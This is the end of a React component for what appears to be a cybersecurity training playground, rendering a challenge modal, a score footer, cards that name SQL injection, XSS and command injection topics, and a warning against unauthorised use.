                              {activeChallenge.type === 'sql-injection' ? 'SQL Injection' :
                                activeChallenge.type === 'xss' ? 'Cross-Site Scripting' :
                                  activeChallenge.type === 'command-injection' ? 'Command Injection' :
                                    activeChallenge.type === 'crypto' ? 'Cryptography' :
                                      'Capture The Flag'}
                            </span>
                          </div>
                        </div>
                      </div>
                      <button
                        onClick={() => {
                          setShowChallengeModal(false);
                          setResult(null);
                        }}
                        className="p-2 rounded-lg border border-white/10 hover:border-white/20 hover:bg-white/5 transition-colors"
                      >
                        <XCircle className="w-5 h-5 text-gray-400" />
                      </button>
                    </div>

                    {/* Modal Body */}
                    <div className="p-6 max-h-[calc(100vh-16rem)] overflow-y-auto custom-scrollbar">
                      {renderChallengeInterface()}

                      {/* Result Display */}
                      <AnimatePresence>
                        {result && (
                          <motion.div
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -20 }}
                            className={`mt-6 rounded-xl border p-6 ${result.success
                                ? 'bg-emerald-500/5 border-emerald-500/30'
                                : 'bg-red-500/5 border-red-500/30'
                              }`}
                          >
                            <div className="flex items-start gap-3">
                              {result.success ? (
                                <CheckCircle className="w-6 h-6 text-emerald-400 flex-shrink-0 mt-1" />
                              ) : (
                                <XCircle className="w-6 h-6 text-red-400 flex-shrink-0 mt-1" />
                              )}
                              <div className="flex-1">
                                <pre className="text-white whitespace-pre-wrap font-mono text-sm leading-relaxed">
                                  {result.message}
                                </pre>
                              </div>
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </div>

                    {/* Modal Footer */}
                    <div className="flex items-center justify-between p-6 border-t border-white/10 bg-white/[0.02]">
                      <div className="flex items-center gap-4">
                        <div className="flex items-center gap-2">
                          <Trophy className="w-4 h-4 text-purple-400" />
                          <span className="text-sm text-gray-400">
                            Score: <strong className="text-white">{score}</strong>
                          </span>
                        </div>
                        <div className="flex items-center gap-2">
                          <Star className="w-4 h-4 text-yellow-400" />
                          <span className="text-sm text-gray-400">
                            Solved: <strong className="text-white">{solvedChallenges.length}/{ALL_CHALLENGES.length}</strong>
                          </span>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <Button
                          onClick={() => {
                            // Find next unsolved challenge
                            const currentIndex = ALL_CHALLENGES.findIndex(c => c.id === activeChallenge?.id);
                            const nextChallenge = ALL_CHALLENGES
                              .slice(currentIndex + 1)
                              .find(c => !solvedChallenges.includes(c.id));

                            if (nextChallenge) {
                              setActiveChallenge(nextChallenge);
                              setResult(null);
                              setSqlQuery('');
                              setXssInput('');
                              setCommandInput('');
                              setCryptoInput('');
                            }
                          }}
                          variant="outline"
                          size="sm"
                          className="border-white/10"
                          disabled={!ALL_CHALLENGES.slice(ALL_CHALLENGES.findIndex(c => c.id === activeChallenge?.id) + 1).find(c => !solvedChallenges.includes(c.id))}
                        >
                          Next Challenge
                        </Button>
                        <Button
                          onClick={() => {
                            setShowChallengeModal(false);
                            setResult(null);
                            setSqlQuery('');
                            setXssInput('');
                            setCommandInput('');
                            setCryptoInput('');
                          }}
                          variant="outline"
                          className="border-white/10"
                        >
                          Close
                        </Button>
                      </div>
                    </div>
                  </div>
                </motion.div>
              </div>
            </div>
          </>
        )}
      </AnimatePresence>

      {/* Educational Section */}
      <div className="container-custom py-20">
        <SectionTitle
          subtitle="Learn Security"
          title="Educational Materials"
          className="mb-12"
        />
        <p className="text-center text-gray-400 mb-12 max-w-2xl mx-auto">
          Learn important security concepts
        </p>

        <motion.div
          className="grid grid-cols-1 md:grid-cols-3 gap-6"
          variants={staggerContainer}
          initial="hidden"
          whileInView="visible"
          viewport={{ once: true }}
        >
          {[
            {
              icon: Database,
              title: 'SQL Injection',
              description: 'Techniques to exploit insecure database queries',
              topics: ['Basic SQLi', 'Union-based', 'Blind SQLi', 'Prevention'],
              gradient: 'from-blue-500 to-cyan-500'
            },
            {
              icon: Code,
              title: 'Cross-Site Scripting',
              description: 'Inject malicious scripts into web applications',
              topics: ['Reflected XSS', 'Stored XSS', 'DOM XSS', 'Protection'],
              gradient: 'from-orange-500 to-red-500'
            },
            {
              icon: Terminal,
              title: 'Command Injection',
              description: 'Execute unauthorized system commands',
              topics: ['OS Commands', 'Code Injection', 'RCE', 'Mitigation'],
              gradient: 'from-green-500 to-emerald-500'
            }
          ].map((item, index) => {
            const Icon = item.icon;
            return (
              <motion.div
                key={index}
                variants={staggerItem}
                className="relative rounded-xl p-6 border border-white/5 bg-white/[0.02] hover:bg-white/[0.05] transition-all group"
              >
                {/* Top gradient line */}
                <div className={`absolute top-0 left-0 right-0 h-1 bg-gradient-to-r ${item.gradient} rounded-t-xl`} />

                <div className={`p-3 rounded-lg border border-white/5 bg-gradient-to-br ${item.gradient} bg-opacity-10 w-fit mb-4`}>
                  <Icon className="w-6 h-6 text-white" />
                </div>
                <h3 className="text-xl font-bold text-white mb-2">{item.title}</h3>
                <p className="text-gray-500 text-sm mb-4 leading-relaxed">{item.description}</p>
                <ul className="space-y-2">
                  {item.topics.map((topic, i) => (
                    <li key={i} className="flex items-center gap-2 text-sm text-gray-500">
                      <CheckCircle className="w-4 h-4 text-purple-400 flex-shrink-0" />
                      {topic}
                    </li>
                  ))}
                </ul>
              </motion.div>
            );
          })}
        </motion.div>
      </div>

      {/* Safety Notice */}
      <div className="border-t border-white/5 bg-white/[0.01] py-16">
        <div className="container-custom">
          <div className="max-w-4xl mx-auto">
            <div className="relative rounded-xl p-8 border border-yellow-500/20 bg-yellow-500/5">
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-yellow-500 to-orange-500 rounded-t-xl" />

              <div className="flex items-start gap-4">
                <div className="p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/20 flex-shrink-0">
                  <AlertTriangle className="w-6 h-6 text-yellow-400" />
                </div>
                <div className="flex-1">
                  <h3 className="text-xl font-bold text-white mb-3">⚠️ Important Warning</h3>
                  <p className="text-gray-300 mb-4 leading-relaxed">
                    This Arena Playground is specifically designed for <strong className="text-white">educational and training purposes</strong>.
                    All activities are conducted in a safe simulated environment.
                  </p>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div className="flex items-start gap-2">
                      <XCircle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
                      <span className="text-sm text-gray-400">
                        <strong className="text-red-400">DO NOT</strong> use these techniques on systems without permission
                      </span>
                    </div>
                    <div className="flex items-start gap-2">
                      <XCircle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
                      <span className="text-sm text-gray-400">
                        <strong className="text-red-400">DO NOT</strong> attack production systems
                      </span>
                    </div>
                    <div className="flex items-start gap-2">
                      <CheckCircle className="w-4 h-4 text-emerald-400 flex-shrink-0 mt-0.5" />
                      <span className="text-sm text-gray-400">
                        <strong className="text-emerald-400">USE</strong> this knowledge for defensive security
                      </span>
                    </div>
                    <div className="flex items-start gap-2">
                      <CheckCircle className="w-4 h-4 text-emerald-400 flex-shrink-0 mt-0.5" />
                      <span className="text-sm text-gray-400">
                        <strong className="text-emerald-400">FOLLOW</strong> laws and responsible hacking ethics
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Auth Modal */}
      <AuthModal
        isOpen={showAuthModal}
        onClose={() => setShowAuthModal(false)}
      />
    </div>
  );
}
